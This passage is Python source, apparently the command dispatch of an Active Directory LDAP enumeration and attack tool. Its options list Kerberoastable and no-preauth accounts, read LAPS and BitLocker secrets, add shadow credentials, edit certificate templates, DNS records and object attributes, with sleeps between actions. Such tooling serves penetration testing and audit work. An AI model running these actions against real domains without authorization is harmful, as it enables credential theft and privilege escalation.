			mapObjects(conn, server, objects)
			maybeSleep(inAction = True)
		if args.SIDsToSAMs != None:
			sids = args.SIDsToSAMs.split(",")
			if (conn == None):
				conn, server = connect_ldap(target, args.signing, args.ldaps, args.startTLS, args.channelBinding, args.username, args.password, args.ntHash, args.domain, args.aesKey, args.ccache, args.cert, args.certPwd, args.certPrivKey)
				maybeSleep(inAction = True)
			mapSIDs(conn, server, sids)
			maybeSleep(inAction = True)
		
		# userAccountControl
		if args.buildUAC != None:
			uac = buildUserAccountControl(args.buildUAC)
			print()
		if args.parseUAC != None:
			rights = parseUserAccountControl(args.parseUAC)
			print()
		
		# Membership
		if args.listMembers != None:
			objects = args.listMembers.split(":")
			if (conn == None):
				conn, server = connect_ldap(target, args.signing, args.ldaps, args.startTLS, args.channelBinding, args.username, args.password, args.ntHash, args.domain, args.aesKey, args.ccache, args.cert, args.certPwd, args.certPrivKey)
				maybeSleep(inAction = True)
			listMembers(conn, server, objects)
			maybeSleep(inAction = True)
		if args.listMemberOfs != None:
			objects = args.listMemberOfs.split(":")
			if (conn == None):
				conn, server = connect_ldap(target, args.signing, args.ldaps, args.startTLS, args.channelBinding, args.username, args.password, args.ntHash, args.domain, args.aesKey, args.ccache, args.cert, args.certPwd, args.certPrivKey)
				maybeSleep(inAction = True)
			listMemberOfs(conn, server, objects)
			maybeSleep(inAction = True)
		
		# Kerberos Pre-Authentication
		if args.listKerbNoPreauth:
			if (conn == None):
				conn, server = connect_ldap(target, args.signing, args.ldaps, args.startTLS, args.channelBinding, args.username, args.password, args.ntHash, args.domain, args.aesKey, args.ccache, args.cert, args.certPwd, args.certPrivKey)
				maybeSleep(inAction = True)
			listKerbNoPreauth(conn, server)
			maybeSleep(inAction = True)

		# Kerberoastable
		if args.listKerberoastable:
			if (conn == None):
				conn, server = connect_ldap(target, args.signing, args.ldaps, args.startTLS, args.channelBinding, args.username, args.password, args.ntHash, args.domain, args.aesKey, args.ccache, args.cert, args.certPwd, args.certPrivKey)
				maybeSleep(inAction = True)
			listKerberoastable(conn, server)
			maybeSleep(inAction = True)
		
		# Domain Password Policy
		if args.getDefaultDomainPwdPolicy:
			if (conn == None):
				conn, server = connect_ldap(target, args.signing, args.ldaps, args.startTLS, args.channelBinding, args.username, args.password, args.ntHash, args.domain, args.aesKey, args.ccache, args.cert, args.certPwd, args.certPrivKey)
				maybeSleep(inAction = True)
			getDefaultDomainPwdPolicy(conn, server)
			maybeSleep(inAction = True)
		if args.listPSO:
			if (conn == None):
				conn, server = connect_ldap(target, args.signing, args.ldaps, args.startTLS, args.channelBinding, args.username, args.password, args.ntHash, args.domain, args.aesKey, args.ccache, args.cert, args.certPwd, args.certPrivKey)
				maybeSleep(inAction = True)
			listPSO(conn, server, args.resolvePSOAppliesTo)
			maybeSleep(inAction = True)
		
		# gMSA
		if args.listGMSA:
			if (conn == None):
				conn, server = connect_ldap(target, args.signing, args.ldaps, args.startTLS, args.channelBinding, args.username, args.password, args.ntHash, args.domain, args.aesKey, args.ccache, args.cert, args.certPwd, args.certPrivKey)
				maybeSleep(inAction = True)
			listGMSA(conn, server)
			maybeSleep(inAction = True)
		
		# LAPS
		if args.listLAPS:
			if (conn == None):
				conn, server = connect_ldap(target, args.signing, args.ldaps, args.startTLS, args.channelBinding, args.username, args.password, args.ntHash, args.domain, args.aesKey, args.ccache, args.cert, args.certPwd, args.certPrivKey)
				maybeSleep(inAction = True)
			listLAPS(conn, server)
			maybeSleep(inAction = True)
		
		# Bitlocker
		if args.listBitlocker:
			if (conn == None):
				conn, server = connect_ldap(target, args.signing, args.ldaps, args.startTLS, args.channelBinding, args.username, args.password, args.ntHash, args.domain, args.aesKey, args.ccache, args.cert, args.certPwd, args.certPrivKey)
				maybeSleep(inAction = True)
			listBitlocker(conn, server)
			maybeSleep(inAction = True)
		
		# LDAP Passwords
		if args.listDesc:
			if args.descFilter != None:
				filter = args.descFilter.split(",")
			else:
				filter = None
			if (conn == None):
				conn, server = connect_ldap(target, args.signing, args.ldaps, args.startTLS, args.channelBinding, args.username, args.password, args.ntHash, args.domain, args.aesKey, args.ccache, args.cert, args.certPwd, args.certPrivKey)
				maybeSleep(inAction = True)
			listDesc(conn, server, filter)
			maybeSleep(inAction = True)
		if args.listPwdsAttr:
			if (conn == None):
				conn, server = connect_ldap(target, args.signing, args.ldaps, args.startTLS, args.channelBinding, args.username, args.password, args.ntHash, args.domain, args.aesKey, args.ccache, args.cert, args.certPwd, args.certPrivKey)
				maybeSleep(inAction = True)
			listPwdsAttr(conn, server)
			maybeSleep(inAction = True)
		if args.listPwdsNotRequired:
			if (conn == None):
				conn, server = connect_ldap(target, args.signing, args.ldaps, args.startTLS, args.channelBinding, args.username, args.password, args.ntHash, args.domain, args.aesKey, args.ccache, args.cert, args.certPwd, args.certPrivKey)
				maybeSleep(inAction = True)
			listPwdsNotRequired(conn, server)
			maybeSleep(inAction = True)
		if args.listPwdsDontExpired:
			if (conn == None):
				conn, server = connect_ldap(target, args.signing, args.ldaps, args.startTLS, args.channelBinding, args.username, args.password, args.ntHash, args.domain, args.aesKey, args.ccache, args.cert, args.certPwd, args.certPrivKey)
				maybeSleep(inAction = True)
			listPwdsDontExpired(conn, server)
			maybeSleep(inAction = True)
		if args.listPwdsExpired:
			if (conn == None):
				conn, server = connect_ldap(target, args.signing, args.ldaps, args.startTLS, args.channelBinding, args.username, args.password, args.ntHash, args.domain, args.aesKey, args.ccache, args.cert, args.certPwd, args.certPrivKey)
				maybeSleep(inAction = True)
			listPwdsExpired(conn, server)
			maybeSleep(inAction = True)
		if args.listPwdsReversibleEncryption:
			if (conn == None):
				conn, server = connect_ldap(target, args.signing, args.ldaps, args.startTLS, args.channelBinding, args.username, args.password, args.ntHash, args.domain, args.aesKey, args.ccache, args.cert, args.certPwd, args.certPrivKey)
				maybeSleep(inAction = True)
			listPwdsReversibleEncryption(conn, server)
			maybeSleep(inAction = True)
		
		# Accounts
		if args.listAccDisabled:
			if (conn == None):
				conn, server = connect_ldap(target, args.signing, args.ldaps, args.startTLS, args.channelBinding, args.username, args.password, args.ntHash, args.domain, args.aesKey, args.ccache, args.cert, args.certPwd, args.certPrivKey)
				maybeSleep(inAction = True)
			listAccDisabled(conn, server)
			maybeSleep(inAction = True)
		if args.listAccLocked:
			if (conn == None):
				conn, server = connect_ldap(target, args.signing, args.ldaps, args.startTLS, args.channelBinding, args.username, args.password, args.ntHash, args.domain, args.aesKey, args.ccache, args.cert, args.certPwd, args.certPrivKey)
				maybeSleep(inAction = True)
			listAccLocked(conn, server)
			maybeSleep(inAction = True)
		if args.listUsers:
			if (conn == None):
				conn, server = connect_ldap(target, args.signing, args.ldaps, args.startTLS, args.channelBinding, args.username, args.password, args.ntHash, args.domain, args.aesKey, args.ccache, args.cert, args.certPwd, args.certPrivKey)
				maybeSleep(inAction = True)
			listUsers(conn, server)
			maybeSleep(inAction = True)
		if args.listComputers:
			if (conn == None):
				conn, server = connect_ldap(target, args.signing, args.ldaps, args.startTLS, args.channelBinding, args.username, args.password, args.ntHash, args.domain, args.aesKey, args.ccache, args.cert, args.certPwd, args.certPrivKey)
				maybeSleep(inAction = True)
			listComputers(conn, server)
			maybeSleep(inAction = True)
		
		# Operating System
		if args.listOS:
			if (conn == None):
				conn, server = connect_ldap(target, args.signing, args.ldaps, args.startTLS, args.channelBinding, args.username, args.password, args.ntHash, args.domain, args.aesKey, args.ccache, args.cert, args.certPwd, args.certPrivKey)
				maybeSleep(inAction = True)
			listOS(conn, server)
			maybeSleep(inAction = True)

		# Pre-2K computers
		if args.listPRE2K:
			if (conn == None):
				conn, server = connect_ldap(target, args.signing, args.ldaps, args.startTLS, args.channelBinding, args.username, args.password, args.ntHash, args.domain, args.aesKey, args.ccache, args.cert, args.certPwd, args.certPrivKey)
				maybeSleep(inAction = True)
			listPRE2K(conn, server)
			maybeSleep(inAction = True)
		
		# ADCS
		if args.listADCS:
			if (conn == None):
				conn, server = connect_ldap(target, args.signing, args.ldaps, args.startTLS, args.channelBinding, args.username, args.password, args.ntHash, args.domain, args.aesKey, args.ccache, args.cert, args.certPwd, args.certPrivKey)
				maybeSleep(inAction = True)
			if args.vulnerableADCS != None:
				vulnerableADCS = args.vulnerableADCS.split(':')
			else:
				vulnerableADCS = []
			listADCS(conn, server, target, args.username, args.password, args.domain, args.ntHash, args.aesKey, args.ccache, vulnerableADCS)
			maybeSleep(inAction = True)
		if args.editTemplate != None:
			if (conn == None):
				conn, server = connect_ldap(target, args.signing, args.ldaps, args.startTLS, args.channelBinding, args.username, args.password, args.ntHash, args.domain, args.aesKey, args.ccache, args.cert, args.certPwd, args.certPrivKey)
				maybeSleep(inAction = True)
			editTemplate(conn, server, args.editTemplate, args.EKU, args.certificateNameFlag, args.enrollmentFlag)
			maybeSleep(inAction = True)
		
		# ADIDNS
		if args.listZones:
			if (conn == None):
				conn, server = connect_ldap(target, args.signing, args.ldaps, args.startTLS, args.channelBinding, args.username, args.password, args.ntHash, args.domain, args.aesKey, args.ccache, args.cert, args.certPwd, args.certPrivKey)
				maybeSleep(inAction = True)
			listZones(conn, server, args.signing, args.ldaps, args.startTLS, args.channelBinding, args.username, args.domain, args.aesKey, args.ccache)
			maybeSleep(inAction = True)
		if args.listRecords != None:
			if (conn == None):
				conn, server = connect_ldap(target, args.signing, args.ldaps, args.startTLS, args.channelBinding, args.username, args.password, args.ntHash, args.domain, args.aesKey, args.ccache, args.cert, args.certPwd, args.certPrivKey)
				maybeSleep(inAction = True)
			listRecords(conn, server, args.listRecords, args.signing, args.ldaps, args.startTLS, args.channelBinding, args.username, args.domain, args.aesKey, args.ccache)
			maybeSleep(inAction = True)
		if args.manageRecord != None:
			if (conn == None):
				conn, server = connect_ldap(target, args.signing, args.ldaps, args.startTLS, args.channelBinding, args.username, args.password, args.ntHash, args.domain, args.aesKey, args.ccache, args.cert, args.certPwd, args.certPrivKey)
				maybeSleep(inAction = True)
			manageRecord(conn, server, target, args.signing, args.ldaps, args.startTLS, args.channelBinding, args.username, args.domain, args.aesKey, args.ccache, *args.manageRecord.split(':'))
			maybeSleep(inAction = True)

		# GPO
		if args.listGPOs:
			if (conn == None):
				conn, server = connect_ldap(target, args.signing, args.ldaps, args.startTLS, args.channelBinding, args.username, args.password, args.ntHash, args.domain, args.aesKey, args.ccache, args.cert, args.certPwd, args.certPrivKey)
				maybeSleep(inAction = True)
			_ = listGPOs(conn, server, target, args.username, args.password, args.domain, args.ntHash, args.aesKey, args.ccache, args.resolveMembers)
			maybeSleep(inAction = True)
		
		# OU
		if args.listOUs:
			if (conn == None):
				conn, server = connect_ldap(target, args.signing, args.ldaps, args.startTLS, args.channelBinding, args.username, args.password, args.ntHash, args.domain, args.aesKey, args.ccache, args.cert, args.certPwd, args.certPrivKey)
				maybeSleep(inAction = True)
			listOUs(conn, server)
			maybeSleep(inAction = True)
		
		# DCs
		if args.listDCs:
			if (conn == None):
				conn, server = connect_ldap(target, args.signing, args.ldaps, args.startTLS, args.channelBinding, args.username, args.password, args.ntHash, args.domain, args.aesKey, args.ccache, args.cert, args.certPwd, args.certPrivKey)
				maybeSleep(inAction = True)
			listDCs(conn, server)
			maybeSleep(inAction = True)

		# Inheritance
		if args.getInheritance != None:
			if (conn == None):
				conn, server = connect_ldap(target, args.signing, args.ldaps, args.startTLS, args.channelBinding, args.username, args.password, args.ntHash, args.domain, args.aesKey, args.ccache, args.cert, args.certPwd, args.certPrivKey)
				maybeSleep(inAction = True)
			getInheritance(conn, server, args.getInheritance.split(':'))
			maybeSleep(inAction = True)
		
		# Domain Trusts
		if args.listDomainTrusts:
			if (conn == None):
				conn, server = connect_ldap(target, args.signing, args.ldaps, args.startTLS, args.channelBinding, args.username, args.password, args.ntHash, args.domain, args.aesKey, args.ccache, args.cert, args.certPwd, args.certPrivKey)
				maybeSleep(inAction = True)
			listDomainTrusts(conn, server)
			maybeSleep(inAction = True)
		
		# Foreign Security Principals
		if args.listForeignPrincipals:
			if (conn == None):
				conn, server = connect_ldap(target, args.signing, args.ldaps, args.startTLS, args.channelBinding, args.username, args.password, args.ntHash, args.domain, args.aesKey, args.ccache, args.cert, args.certPwd, args.certPrivKey)
				maybeSleep(inAction = True)
			if args.filterSIDs != None:
				filterSIDs = args.filterSIDs.split(',')
			else:
				filterSIDs = None
			listForeignPrincipals(conn, server, args.signing, args.ldaps, args.startTLS, args.channelBinding, args.username, args.password, args.ntHash, args.domain, args.aesKey, args.ccache, args.cert, args.certPwd, args.certPrivKey, args.resolveSIDs, filterSIDs)
			maybeSleep(inAction = True)
		
		# Shadow Creds
		if args.shadowCreds != None:
			if (conn == None):
				conn, server = connect_ldap(target, args.signing, args.ldaps, args.startTLS, args.channelBinding, args.username, args.password, args.ntHash, args.domain, args.aesKey, args.ccache, args.cert, args.certPwd, args.certPrivKey)
				maybeSleep(inAction = True)
			addShadowCreds(conn, server, args.shadowCreds, password = args.pfxPwd, exportType = args.exportType)
			maybeSleep(inAction = True)
		
		# SCCM / MECM
		if args.listSCCM:
			if (conn == None):
				conn, server = connect_ldap(target, args.signing, args.ldaps, args.startTLS, args.channelBinding, args.username, args.password, args.ntHash, args.domain, args.aesKey, args.ccache, args.cert, args.certPwd, args.certPrivKey)
				maybeSleep(inAction = True)
			listSCCM(conn, server, args.domain, args.username, args.password, args.ntHash, args.aesKey, args.ccache)
			maybeSleep(inAction = True)
		
		# Raw LDAP query
		if args.searchFilter != None:
			if (conn == None):
				conn, server = connect_ldap(target, args.signing, args.ldaps, args.startTLS, args.channelBinding, args.username, args.password, args.ntHash, args.domain, args.aesKey, args.ccache, args.cert, args.certPwd, args.certPrivKey)
				maybeSleep(inAction = True)
			if (args.searchAttributes == None):
				attributes = [ALL_ATTRIBUTES, ALL_OPERATIONAL_ATTRIBUTES]
			else:
				attributes = args.searchAttributes.split(",")
			LDAPQuery(conn, server, args.signing, args.ldaps, args.startTLS, args.channelBinding, args.username, args.domain, args.aesKey, args.ccache, args.searchBaseDN, args.searchFilter, attributes)
			maybeSleep(inAction = True)
		if args.editAttribute != None:
			if (conn == None):
				conn, server = connect_ldap(target, args.signing, args.ldaps, args.startTLS, args.channelBinding, args.username, args.password, args.ntHash, args.domain, args.aesKey, args.ccache, args.cert, args.certPwd, args.certPrivKey)
				maybeSleep(inAction = True)
			LDAPEdit(conn, server, *args.editAttribute.split(":"))
			maybeSleep(inAction = True)

##################################################
#                     TODO                       #
##################################################

# - Add Azure endpoints enum features
# - Vulnerable ACLs searches
#	- Verify denied ACEs before adding potential exploits
# - GPOs
#	- Check Security Filtering/WMI Filtering configuration when displaying GPO
# - Implement LDAPNOMNOM technique (user enum)
# - Add ESC9-14